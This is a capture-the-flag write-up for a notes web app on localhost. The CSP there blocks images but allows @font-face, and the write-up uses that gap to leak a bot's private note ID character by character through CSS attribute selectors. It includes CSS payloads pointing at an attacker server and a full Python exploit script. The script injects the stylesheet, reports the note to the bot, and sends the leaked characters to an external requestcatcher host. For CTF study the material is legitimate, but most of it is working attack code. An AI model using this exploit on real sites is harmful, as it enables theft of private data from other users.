- as we can see, xss blocked and image exfiltration blocked.
- Because the CSP blocked images (img-src 'none') but allowed fonts to be defined via @font-face.
- The vulnerability arises when an attacker crafts CSS rules that conditionally load a custom font, which is sourced from the attacker's server, thereby leaking information character-by-character.
- The bot needs to be tricked into requesting a file (a "font") from the attacker's server only when a specific, secret character (part of the flag ID) is present on the page.

- The payload uses two key components: @font-face declarations and CSS Attribute Selectors.

A. @font-face Declaration (The Leakage Mechanism)

The @font-face rule defines a custom font and where to find its source (src).

• The script creates one @font-face definition for every possible character in the flag ID (e.g., '0', 'a', 'b', etc.).

• The src property is set to the attacker's webhook URL, along with a unique identifier that specifies which character is currently being tested.

Example:
```
@font-face {
  font-family: exfilFont0; /* Font associated with character '0' */
  src: url(https://YOUR_SERVER/?id=0); /* Attacker URL leaks the '0' */
}
@font-face {
  font-family: exfilFonta; /* Font associated with character 'a' */
  src: url(https://YOUR_SERVER/?id=a); /* Attacker URL leaks the 'a' */
}
```

B. CSS Attribute Selector (The Conditional Trigger)

The CSS Attribute Selector (`a[href^='...']`) conditionally applies a style (using one of the custom font-family names) only if a specific element on the page matches the selector.

• In this challenge, the target element is a link (`<a>` tag) that is generated by the markdown parser.

• The link element that contains the note ID is targeted. The selector checks if the link's href attribute starts with a sequence of known characters plus the character currently being tested.

Example: 
```
If the bot's private note ID begins with /api/notes/0:
a[href^='/api/notes/0'] { 
  font-family: exfilFont0; /* Apply the font associated with '0' */
}
```

import json
import time
import random
import string
import requests 

URL = "http://localhost:8000"

# Example:
#      f54dbf57-3317-4d6c-b903-bc56868fd728
EXFILTRATION = "https://player.requestcatcher.com/"
UID = ""

def register(user, password):
    r = requests.post(URL+'/api/auth/register', data={'email': user, 'password': password})


def login(user, password):
    r = requests.post(URL+'/api/auth/login', data={'email': user, 'password': password}, allow_redirects=False)
    return r.cookies["token"]


def first_payload(cookie):
    global UID
    payload = ""
    for letter in string.hexdigits[:16]:
        character = UID + letter
        payload += """
        @font-face {
          font-family: exfilFont"""+character+""";
          src: url(""" + EXFILTRATION +  """?id="""+character+""");
        }
        a[href^='/api/notes/""" + character + """'] {
          font-family: exfilFont"""+character+""";
        }
        """
    return json.loads(requests.post(URL+'/api/notes', cookies=cookie, data={'title':payload, 'content':' '}).text)["id"]

def second_payload(id, cookie):
    payload = f"""<link rel=stylesheet href="/static/api/notes/{id}"/>"""
    return json.loads(requests.post(URL+'/api/notes', cookies=cookie, data={'title':payload, 'content': ' '}).text)["id"]

def report(id, cookie):
    print(f"Reporting... {id}")
    r = requests.post(URL+'/report', cookies=cookie, data={'noteId': id})
    print(r.text)


USER = ''.join(random.choice(string.digits+string.ascii_letters) for _ in range(10))
PASSWORD = ''.join(random.choice(string.digits+string.ascii_letters) for _ in range(10))
print(f"USER {USER} -- PASSWORD {PASSWORD}")
register(USER, PASSWORD)
cookie = login(USER, PASSWORD)
while True:
    print(f"[X] UID: {UID}")
    id = first_payload({'token': cookie})
    id = second_payload(id, {'token': cookie})
    report(id, {'token': cookie})
    time.sleep(0.5)
    new_char = input("> ")
    UID += new_char
    if len(UID) in [8,13,18,23]:
        UID += '-'
